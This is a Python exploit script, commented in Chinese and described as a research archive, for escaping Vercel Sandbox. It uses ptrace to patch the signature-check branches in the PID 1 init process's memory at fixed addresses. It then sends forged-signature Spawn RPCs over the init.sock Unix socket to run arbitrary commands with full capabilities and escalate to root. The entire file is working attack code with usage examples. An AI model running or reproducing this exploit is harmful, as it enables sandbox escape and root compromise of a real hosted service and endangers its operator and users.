#!/usr/bin/env python3
# init_sock_bypass.py — Vercel Sandbox init.sock 免签名控制客户端 (研究存档)
#
# 利用链:
#   1. 沙箱内任意代码执行 (Vercel Sandbox 默认能力)
#   2. process_vm_readv/ptrace 读写 PID 1 (sandbox-init) 内存
#   3. POKEDATA patch 签名验证函数 3 个失败分支 (Go 寄存器 ABI: rax/rbx 返回 error=nil)
#   4. 通过 /run/vercel/share/init.sock 调用 SpawnService/Spawn
#      - 任意 x-signature (base64 64B) + x-timestamp 即可通过 ed25519 验证
#      - body = flags(1B, 0x00) + BE32 length + JSON/proto payload
#   5. Spawn 出的进程继承 sandbox-init 全部 capabilities, 可 setuid(0) -> root
#
# 用法 (在沙箱内): python3 init_sock_bypass.py "命令" [参数...]
# 示例: python3 init_sock_bypass.py id
#       python3 init_sock_bypass.py sh -c "ls /dev/vda && id"
import json, struct, subprocess, sys, time, base64, ctypes

PATCH_A = bytes.fromhex("31c031db4881c4d00000005dc3")  # xor eax,eax; xor ebx,ebx; add rsp,0xd0; pop rbp; ret
PATCH_B = bytes.fromhex("31c031db4881c4900000005dc3")  # 栈帧 0x90 版本
PATCH_SITES = [0x83b571, 0x83b5af, 0x82a9f9]

SOCK = "/run/vercel/share/init.sock"
RPC = "/vercel.sandbox.spawn.v1.SpawnService/Spawn"

def ptrace_rw(addr, data=None, read_len=0):
    libc = ctypes.CDLL("libc.so.6", use_errno=True)
    libc.ptrace.argtypes = [ctypes.c_ulong, ctypes.c_ulong, ctypes.c_void_p, ctypes.c_void_p]
    libc.ptrace.restype = ctypes.c_long
    libc.waitpid.argtypes = [ctypes.c_int, ctypes.c_void_p, ctypes.c_int]
    libc.waitpid.restype = ctypes.c_int
    libc.ptrace(16, 1, None, None)
    wp = libc.waitpid(1, None, 0)
    if wp != 1:
        libc.ptrace(17, 1, None, None)
        return -1, "waitpid=%d" % wp
    if data is not None:
        ok = 0
        total = (len(data) + 7) // 8
        for off in range(0, len(data), 8):
            word = int.from_bytes(data[off:off+8].ljust(8, b"\x00"), "little")
            r = libc.ptrace(5, 1, addr + off, word)  # PTRACE_POKEDATA
            if r == 0:
                ok += 1
        libc.ptrace(17, 1, None, None)
        return ok, total
    out = b""
    off = 0
    while off < read_len:
        v = libc.ptrace(4, 1, addr + off, None)  # PTRACE_PEEKDATA
        if v == -1:
            break
        out += (v & 0xFFFFFFFFFFFFFFFF).to_bytes(8, "little")
        off += 8
    libc.ptrace(17, 1, None, None)
    return len(out), out

def patch_sigcheck():
    for va in PATCH_SITES:
        p = PATCH_A if va != 0x82a9f9 else PATCH_B
        ok, total = ptrace_rw(va, data=p)
        if ok != total:
            raise RuntimeError("patch %#x failed %d/%d" % (va, ok, total))
    print("[*] signature check bypassed (%d sites patched)" % len(PATCH_SITES), flush=True)

def _rpc(path, req_body=b"{}", ctype="application/connect+json", timeout=20):
    body = req_body if req_body[:1] in (b"\x00", b"\x02") else b"\x00" + struct.pack(">I", len(req_body)) + req_body
    cmd = ["curl", "-sS", "--max-time", str(timeout), "-i", "-X", "POST",
           "--unix-socket", SOCK,
           "-H", "Content-Type: " + ctype,
           "-H", "Connect-Protocol-Version: 1",
           "-H", "x-timestamp: " + str(int(time.time() * 1000)),
           "-H", "x-signature: " + base64.b64encode(b"\x99" * 64).decode(),
           "--data-binary", "@-", "http://localhost" + path]
    r = subprocess.run(cmd, input=body, capture_output=True, timeout=timeout + 2)
    out = r.stdout
    idx = out.find(b"\r\n\r\n")
    return out[idx + 4:] if idx >= 0 else out


def spawn(command, args=None, environment=None, working_directory=None, timeout=20):
    req = {"command": command}
    if args:
        req["arguments"] = args
    if environment:
        req["environment"] = environment
    if working_directory:
        req["working_directory"] = working_directory
    body = json.dumps(req).encode()
    data = _rpc(RPC, body)
    i = 0
    while i + 5 <= len(data):
        ln = struct.unpack(">I", data[i+1:i+5])[0]
        if i + 5 + ln > len(data):
            break
        payload = data[i+5:i+5+ln]
        try:
            ev = json.loads(payload)
        except Exception:
            ev = payload
        if isinstance(ev, dict) and "stdout" in ev:
            sys.stdout.buffer.write(base64.b64decode(ev["stdout"]))
            sys.stdout.buffer.flush()
        elif isinstance(ev, dict) and "stderr" in ev:
            sys.stderr.buffer.write(base64.b64decode(ev["stderr"]))
            sys.stderr.buffer.flush()
        elif isinstance(ev, dict) and "exit" in ev:
            sys.stdout.write("[exit %s]\n" % json.dumps(ev["exit"]))
            sys.stdout.flush()
        elif isinstance(ev, dict) and "error" in ev:
            print("[error] %s" % json.dumps(ev), flush=True)
        i += 5 + ln


def ping():
    data = _rpc("/vercel.sandbox.spawn.v1.SpawnService/Ping", b"{}")
    print("[ping] %r" % data[:200], flush=True)


def kill(process_id, timeout=10):
    body = json.dumps({"processId": process_id}).encode()
    data = _rpc("/vercel.sandbox.spawn.v1.SpawnService/Kill", body, timeout=timeout)
    print("[kill %s] %r" % (process_id, data[:200]), flush=True)

def main():
    if len(sys.argv) < 2:
        print("usage: %s <command> [args...]" % sys.argv[0])
        sys.exit(1)
    patch_sigcheck()
    spawn(sys.argv[1], sys.argv[2:])

if __name__ == "__main__":
    main()
